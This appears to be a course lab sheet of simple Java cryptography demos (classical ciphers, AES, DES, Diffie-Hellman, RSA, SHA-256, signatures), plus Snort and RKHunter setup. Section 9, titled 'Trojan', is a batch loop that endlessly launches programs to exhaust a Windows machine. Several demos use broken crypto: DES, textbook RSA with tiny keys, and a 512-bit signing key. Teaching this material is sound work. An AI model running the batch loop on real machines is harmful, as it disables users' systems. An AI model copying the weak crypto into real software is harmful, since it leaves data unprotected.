# Cryptography Programs - Simplest

Files in `@simplest/`:

- 1a-CaesarCipher.java
- 1b-PlayfairCipher.java
- 1c-HillCipher.java
- 1d-VigenereCipher.java
- 2a-RailFence.java
- 2b-RowColumn.java
- 3-AES.java
- 4-DES.java
- 5-DiffieHellman.java
- 6-RSA.html
- 6-RSA.java
- 7-SHA.java
- 8-DigitalSignature.java

---

## 1a. Caesar Cipher

```
P = plaintext, K = key
C = (P + K) % 26  (encrypt)
P = (C - K) % 26  (decrypt)
```
```java
class CaesarCipher {
    public static void main(String[] args) {
        String text = "HELLO WORLD";
        int key = 3;

        StringBuilder enc = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            if (c >= 'A' && c <= 'Z') {
                enc.append((char)((c - 'A' + key) % 26 + 'A'));
            } else {
                enc.append(c);
            }
        }

        StringBuilder dec = new StringBuilder();
        for (int i = 0; i < enc.length(); i++) {
            char c = enc.charAt(i);
            if (c >= 'A' && c <= 'Z') {
                dec.append((char)((c - 'A' - key + 26) % 26 + 'A'));
            } else {
                dec.append(c);
            }
        }

        System.out.println("Text: " + text);
        System.out.println("Key: " + key);
        System.out.println("Encrypted: " + enc);
        System.out.println("Decrypted: " + dec);
    }
}
```

---

## 1b. Playfair Cipher

```
5x5 matrix from key word
Encrypt pairs: same row→right, same col→below, rectangle→swap columns
```
```java
class PlayfairCipher {
    static char[][] key = {
        {'M','O','N','A','R'},
        {'C','H','Y','B','D'},
        {'E','F','G','I','K'},
        {'L','P','Q','S','T'},
        {'U','V','W','X','Z'}
    };

    static int[] find(char c) {
        for (int i = 0; i < 5; i++)
            for (int j = 0; j < 5; j++)
                if (key[i][j] == c)
                    return new int[]{i, j};
        return null;
    }

    static String solve(String text) {
        int[] p1 = find(text.charAt(0));
        int[] p2 = find(text.charAt(1));

        if (p1[0] == p2[0]) {
            return "" + key[p1[0]][(p1[1] + 1) % 5] + key[p2[0]][(p2[1] + 1) % 5];
        }

        if (p1[1] == p2[1]) {
            return "" + key[(p1[0] + 1) % 5][p1[1]] + key[(p2[0] + 1) % 5][p2[1]];
        }

        return "" + key[p1[0]][p2[1]] + key[p2[0]][p1[1]];
    }

    public static void main(String[] args) {
        String text = "HI";
        String enc = solve(text);

        System.out.println("Text: " + text);
        System.out.println("Encrypted Text: " + enc);
    }
}
```

---

## 1c. Hill Cipher

```
2x2 key matrix K
C = K × P mod 26  (matrix × vector)
```
```java
class HillCipher {
    static int[][] key = {
        {3, 3},
        {2, 5}
    };

    public static void main(String[] args) {
        String text = "HI";

        int[] vec = {
            text.charAt(0) - 'A',
            text.charAt(1) - 'A'
        };

        char first = (char) (((key[0][0] * vec[0] + key[0][1] * vec[1]) % 26) + 'A');
        char second = (char) (((key[1][0] * vec[0] + key[1][1] * vec[1]) % 26) + 'A');

        System.out.println("Text: " + text);
        System.out.println("Encrypted Text: " + first + second);
    }
}
```

---

## 1d. Vigenere Cipher

```
Repeat key to match plaintext length
C = (P + K[i]) % 26
```
```java
class VigenereCipher {
    public static void main(String[] args) {
        String text = "ATTACKATDAWN";
        String key = "LEMON";

        StringBuilder enc = new StringBuilder();

        for (int i = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            if (c >= 'A' && c <= 'Z') {
                enc.append((char)((c - 'A' + key.charAt(i % key.length()) - 'A') % 26 + 'A'));
            } else {
                enc.append(c);
            }
        }

        StringBuilder dec = new StringBuilder();
        for (int i = 0; i < enc.length(); i++) {
            char c = enc.charAt(i);
            if (c >= 'A' && c <= 'Z') {
                dec.append((char)((c - 'A' - key.charAt(i % key.length()) + 26) % 26 + 'A'));
            } else {
                dec.append(c);
            }
        }

        System.out.println("Encrypted: " + enc);
        System.out.println("Decrypted: " + dec);
    }
}
```

---

## 2a. Rail Fence

```
Write text in zigzag pattern across N rails
Read row by row to get ciphertext
```
```java
class RailFence {
    public static void main(String[] args) {
        String text = "WEAREDISCOVERED";
        int rails = 3;

        if (rails < 2) rails = 2;

        StringBuilder[] rail = new StringBuilder[rails];
        for (int i = 0; i < rails; i++) {
            rail[i] = new StringBuilder();
        }

        int pos = 0;
        boolean down = false;

        for (int i = 0; i < text.length(); i++) {
            rail[pos].append(text.charAt(i));
            if (i == 0 || i == rails - 1) down = !down;
            pos += down ? 1 : -1;
        }

        StringBuilder enc = new StringBuilder();
        for (int i = 0; i < rails; i++) {
            enc.append(rail[i]);
        }

        System.out.println("Text: " + text);
        System.out.println("Encrypted: " + enc);
    }
}
```

---

## 2b. Row Column

```
Fill matrix row-wise with plaintext
Read column-wise for ciphertext
```
```java
class RowColumn {
    public static void main(String[] args) {
        String text = "HELLOWORLD";
        int rows = 2;
        int cols = 5;

        int len = rows * cols;
        while (text.length() < len) text += 'X';
        text = text.substring(0, len);

        char[][] mat = new char[rows][cols];
        int k = 0;

        for (int i = 0; i < rows; i++) {
            for (int j = 0; j < cols; j++) {
                mat[i][j] = text.charAt(k++);
            }
        }

        StringBuilder enc = new StringBuilder();
        for (int j = 0; j < cols; j++) {
            for (int i = 0; i < rows; i++) {
                enc.append(mat[i][j]);
            }
        }

        System.out.println("Text: " + text);
        System.out.println("Encrypted: " + enc);
    }
}
```

---

## 3. AES

```
AES-128: 128-bit key, symmetric block cipher
Use javax.crypto.Cipher
```
```java
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.KeyGenerator;

import java.util.Base64;

public class AES {
    public static void main(String[] args) throws Exception {
        String plainText = "Hello AES";

        KeyGenerator keygen = KeyGenerator.getInstance("AES");
        keygen.init(128);
        SecretKey secret = keygen.generateKey();

        Cipher cipher = Cipher.getInstance("AES");

        cipher.init(Cipher.ENCRYPT_MODE, secret);
        byte[] encryptedBytes = cipher.doFinal(plainText.getBytes());
        String encryptedText = Base64.getEncoder().encodeToString(encryptedBytes);

        cipher.init(Cipher.DECRYPT_MODE, secret);
        byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(encryptedText));
        String decryptedText = new String(decryptedBytes);

        System.out.println("Encrypted Text: " + encryptedText);
        System.out.println("Decrypted Text: " + decryptedText);
    }
}
```

---

## 4. DES

```
DES: 56-bit key, 64-bit block
Use javax.crypto.Cipher
```
```java
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.KeyGenerator;

import java.util.Base64;

public class DES {
    public static void main(String[] args) throws Exception {
        String plainText = "Hello DES";

        KeyGenerator keygen = KeyGenerator.getInstance("DES");
        keygen.init(56);
        SecretKey secret = keygen.generateKey();

        Cipher cipher = Cipher.getInstance("DES");

        cipher.init(Cipher.ENCRYPT_MODE, secret);
        byte[] encryptedBytes = cipher.doFinal(plainText.getBytes());
        String encryptedText = Base64.getEncoder().encodeToString(encryptedBytes);

        cipher.init(Cipher.DECRYPT_MODE, secret);
        byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(encryptedText));
        String decryptedText = new String(decryptedBytes);

        System.out.println("Encrypted Text: " + encryptedText);
        System.out.println("Decrypted Text: " + decryptedText);
    }
}
```

---

## 5. Diffie-Hellman

```
Public keys: A = g^a mod p, B = g^b mod p
Shared secret: Key = B^a mod p = A^b mod p
```
```java
import java.math.BigInteger;

class DiffieHellman {
    public static void main(String[] args) {
        BigInteger p = BigInteger.valueOf(23);
        BigInteger g = BigInteger.valueOf(5);
        BigInteger a = BigInteger.valueOf(6);
        BigInteger b = BigInteger.valueOf(15);

        BigInteger A = g.modPow(a, p);
        BigInteger B = g.modPow(b, p);

        System.out.println("\nPublic Key A: " + A);
        System.out.println("Public Key B: " + B);

        BigInteger keyA = B.modPow(a, p);
        BigInteger keyB = A.modPow(b, p);

        System.out.println("\nSecret Key A: " + keyA);
        System.out.println("Secret Key B: " + keyB);
    }
}
```

---

## 6. RSA (HTML)

```
n = p × q, φ = (p-1)(q-1)
e × d ≡ 1 (mod φ)
C = M^e mod n, M = C^d mod n
```
```html
<!DOCTYPE html>
<html>
<body>
<h3>RSA Demo</h3>

<input id="msg" placeholder="Enter number">
<button onclick="enc()">Encrypt</button>
<button onclick="dec()">Decrypt</button>

<p id="out"></p>

<script>
let n=33, e=3, d=7, c;

function enc(){
  let m = msg.value;
  c = (m**e) % n;
  out.innerHTML = "Encrypted: " + c;
}

function dec(){
  out.innerHTML = "Decrypted: " + ((c**d) % n);
}
</script>

</body>
</html>
```

---

## 6. RSA (Java)

```
RSA-2048: KeyPairGenerator, Cipher.ENCRYPT_MODE
C = RSA.encrypt(M), M = RSA.decrypt(C)
```
```java
import java.util.*;
import java.security.*;
import javax.crypto.*;

class RSA {
    public static void main(String[] args) throws Exception {
        String msg = "Hello RSA";

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
        kpg.initialize(2048);
        KeyPair kp = kpg.generateKeyPair();

        Cipher cipher = Cipher.getInstance("RSA");
        cipher.init(Cipher.ENCRYPT_MODE, kp.getPublic());
        byte[] enc = cipher.doFinal(msg.getBytes());

        cipher.init(Cipher.DECRYPT_MODE, kp.getPrivate());
        byte[] dec = cipher.doFinal(enc);

        System.out.println("Encrypted: " + HexFormat.of().formatHex(enc));
        System.out.println("Decrypted: " + new String(dec));
    }
}
```

---

## 7. SHA-256

```
SHA-256: 256-bit hash
MessageDigest.getInstance("SHA-256")
```
```java
import java.security.MessageDigest;

public class SHA {
    public static void main(String[] args) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");

        byte[] hash = md.digest("Hello".getBytes());

        for (byte b : hash) {
            System.out.print(String.format("%02x", b));
        }
    }
}
```

---

## 8. Digital Signature

```
Sign with private key, verify with public key
Signature.getInstance("SHA256withRSA")
```
```java
import java.security.*;

public class DigitalSignature {
    public static void main(String[] args) throws Exception {

        String msg = "Hi";

        KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
        keyGen.initialize(512);
        KeyPair keys = keyGen.generateKeyPair();

        Signature sign = Signature.getInstance("SHA256withRSA");

        sign.initSign(keys.getPrivate());
        sign.update(msg.getBytes());
        byte[] signature = sign.sign();

        sign.initVerify(keys.getPublic());
        sign.update(msg.getBytes());
        boolean ok = sign.verify(signature);

        System.out.println("Verified: " + ok);
    }
}
```

---

## 9. Trojan

```bat
@echo off
:x
start mspaint
start notepad
start cmd
start explorer
start control
start calc
goto x
```

---

## 10. Snort

```bash
sudo add-apt-repository universe
sudo apt update
sudo apt install snort -y

snort -V

sudo nano /etc/snort/rules/local.rules
alert icmp any any -> any any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)

sudo nano /etc/snort/snort.conf
include $RULE_PATH/local.rules

ip a
sudo snort -i eth0 -A console -c /etc/snort/snort.conf
```

---

## 11. RKHunter

```bash
sudo apt update
sudo apt upgrade -y
sudo apt install -y rkhunter
sudo rkhunter --check
```